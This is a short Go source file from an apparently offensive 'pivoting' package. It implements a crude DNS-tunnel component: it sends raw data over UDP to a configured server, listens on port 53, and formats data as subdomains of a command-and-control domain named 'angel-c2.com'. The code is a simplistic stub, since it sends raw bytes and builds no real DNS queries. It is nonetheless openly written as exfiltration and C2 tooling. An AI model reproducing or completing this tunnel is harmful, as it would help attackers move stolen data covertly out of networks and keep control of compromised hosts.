package pivoting

import (
"fmt"
"net"
"time"
)

type DNSResult struct {
Status string
}

type DNSTunnel struct {
Server string
}

func (t *DNSTunnel) SendData(data string) DNSResult {
conn, err := net.DialTimeout("udp", t.Server, 5*time.Second)
if err != nil {
return DNSResult{Status: "error"}
}
conn.Write([]byte(data))
conn.Close()
return DNSResult{Status: "success"}
}

func (t *DNSTunnel) ReceiveData() DNSResult {
conn, err := net.ListenPacket("udp", ":53")
if err != nil {
return DNSResult{Status: "error"}
}
defer conn.Close()
buf := make([]byte, 4096)
conn.ReadFrom(buf)
return DNSResult{Status: string(buf)}
}

func FormatDNSPayload(data string) string {
return fmt.Sprintf("%s.angel-c2.com", data)
}
